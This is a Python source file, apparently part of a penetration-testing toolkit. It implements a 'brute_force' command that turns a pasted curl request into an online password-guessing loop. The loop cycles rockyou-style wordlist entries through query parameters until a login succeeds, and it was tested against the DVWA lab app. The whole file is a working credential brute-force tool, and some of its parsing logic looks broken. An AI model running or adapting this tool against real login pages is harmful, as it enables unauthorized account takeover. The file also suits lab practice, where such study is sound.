import shlex
from argparse import ArgumentParser
from typing import Any

from prompt_toolkit import prompt
from requests import request

from core.commands.run import tcve_command
from core.commands.web.brute_force_parser import BruteForceParser
from core.context import Context
from core.io import OUT

CurlParser = ArgumentParser(prog="curl")
CurlParser.add_argument("url")
CurlParser.add_argument("-H", dest="headers", action="append", required=False)
CurlParser.add_argument("-b", dest="cookies", required=False)
CurlParser.add_argument("--insecure", action="store_true")
CurlParser.add_argument("-X", action="store_true")


def dictionary_value(wordlist: str):
    with open(wordlist, "rb") as file:
        for line in file.readlines():
            yield line.decode().strip()


def process_cve_script(script: str, context: dict[str, Any]):
    """I'm too lazy for tokenization and later processing :-("""
    parts = shlex.split(script)
    values: list[Any] = []

    # substitution
    for token in parts:
        if token == "ok":
            values.append(context["response"].ok)
        elif token == "response":
            values.append(context["response"])
        elif token == "body":
            values.append(context["response"].text)
        elif token == "status":
            values.append(context["response"].status)
        else:
            values.append(token)
    # processing
    results: list[bool | str] = []
    past_token = None
    operation = None
    auxiliar = None
    for token in values:
        if token == "and":
            operation = "and"
        elif token == "is":
            operation = "is"
        elif token == "not":
            auxiliar = "not"
        elif token == "in":
            operation = "in"
        elif token and operation:
            if not past_token:
                raise SyntaxError("Invalid syntax")
            if operation == "is":
                results.append(past_token == token)
            elif operation in ["and", "or"]:
                if auxiliar == "not":
                    results.append(not past_token)
                    auxiliar = None
                else:
                    results.append(past_token)
                results.append(operation)
            elif operation == "in":
                if auxiliar == "not":
                    results.append(past_token not in token)
                    auxiliar = None
                else:
                    results.append(past_token in token)
            operation = None
        else:
            past_token = token
    result = results[0]
    for i in range(1, len(results), 2):
        if results[i] == "and":
            result = result and results[i + 1]
        elif results[i] == "or":
            result = result or results[i + 1]
    return result


@tcve_command("brute_force", parser=BruteForceParser)
def brute_force(
    context: Context,
    query_param: list[str] | None,
    body_json: list[str] | None,
    body_form: list[str] | None,
    expects: str | None,
    wordlist: str,
):
    """
    This command turns a curl command into a bruteforceable query, tested against DVWA brute_force

    curl 'http://192.168.56.102/dvwa/vulnerabilities/brute/?username={username}&password={password}&Login=Login' \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
        -H 'Accept-Language: en-US,en;q=0.9,es;q=0.8' \
        -H 'Connection: keep-alive' \
        -b 'security=high; PHPSESSID=0f7e06c6c272b7cfeaff704a7ab2c2e5' \
        -H 'Referer: http://192.168.56.102/dvwa/vulnerabilities/brute/' \
        -H 'Upgrade-Insecure-Requests: 1' \
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36' \
        --insecure
    Usage:
        Brute force the username and password looking for the return message to not contain the access denied messag e error in the body
        $ brute_force -Q username -Q password --expects="ok and 'Username and/or password incorrect.' not in body "
        $ brute_force -Q username -Q password --expects "'Username and/or password incorrect.' not in body" -W /usr/share/dict/rockyou.txt 
    """
    command = prompt("Enter the CURL command:\n")
    parts = command.split(" ", 1)
    assert len(parts) == 2, "Invalid CURL command given"
    signature, params = parts[0].strip(), parts[1].strip()
    if signature != "curl":
        raise ValueError("This doesn't seems like a curl command")

    params = [x for x in shlex.split(command) if x.strip()]
    curl_parts = CurlParser.parse_args(params[1:])

    headers = dict([header.split(": ", 1) for header in curl_parts.headers])
    cookies = dict(
        [cookie.strip().split("=") for cookie in curl_parts.cookies.split(";")]
    )
    data: dict[Any, Any] = {}
    query_params: dict[Any, Any] = {}
    dict_entry = dictionary_value(wordlist)
    while True:
        res = request(
            "GET",
            curl_parts.url,
            headers=headers,
            params=query_params,
            data=data,
            cookies=cookies,
            verify=not curl_parts.insecure,
        )
        if (
            expects
            and process_cve_script(
                expects, context={"response": res, "input": curl_parts}
            )
            or (not expects and res.ok)
        ):
            OUT.print("Cracked")
            break
        else:
            if query_param:
                for p in query_param:
                    query_params[p] = next(dict_entry)
